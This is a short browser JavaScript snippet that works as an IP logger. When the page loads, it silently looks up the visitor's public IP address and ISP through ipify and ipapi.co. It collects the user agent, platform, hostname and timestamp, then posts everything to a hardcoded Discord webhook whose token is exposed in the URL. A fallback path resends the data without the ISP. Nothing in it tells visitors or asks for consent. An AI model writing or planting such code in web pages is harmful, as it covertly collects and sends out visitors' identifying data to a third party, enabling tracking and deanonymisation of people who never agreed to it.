
const timestamp = Date.now();


let ip = "";
let browser = window.navigator.userAgent;
let os = window.navigator.platform;
let userAgent = navigator.userAgent;
let hostName = window.location.hostname;
let isp = "";


fetch("https://api.ipify.org")
  .then(response => response.text()) 
  .then(data => { 
    ip = data;
    return fetch(`https://ipapi.co/${ip}/json/`); 
  })
  .then(response => response.json()) 
  .then(data => { 
    isp = data.org;
    
    const body = { content: `Date/Time: ${timestamp}\nIP Address: ${ip}\nBrowser: ${browser}\nOperating System: ${os}\nUser Agent: ${userAgent}\nHost Name: ${hostName}\nISP: ${isp}` };
    fetch("https://discord.com/api/webhooks/1161339513059160144/-9a91YW7mvzuxvbxDXg6NrqzNlkZwZjNsSym097_TDIr6G5qgHxUe4l9aAu_tJGO0vAc", { method: "POST", body: JSON.stringify(body), headers: { "Content-Type": "application/json" } })
      .then(() => console.log("Success!")) // Log a success message to the console if the request is successful
      .catch(() => { 
        const body = { content: `Date/Time: ${timestamp}\nIP Address: ${ip}\nBrowser: ${browser}\nOperating System: ${os}\nUser Agent: ${userAgent}\nHost Name: ${hostName}` };
        fetch("https://discord.com/api/webhooks/1161339513059160144/-9a91YW7mvzuxvbxDXg6NrqzNlkZwZjNsSym097_TDIr6G5qgHxUe4l9aAu_tJGO0vAc", { method: "POST", body: JSON.stringify(body), headers: { "Content-Type": "application/json" } })
          .then(() => console.log("Success! (fallback)")) 
      }); 
  }); 
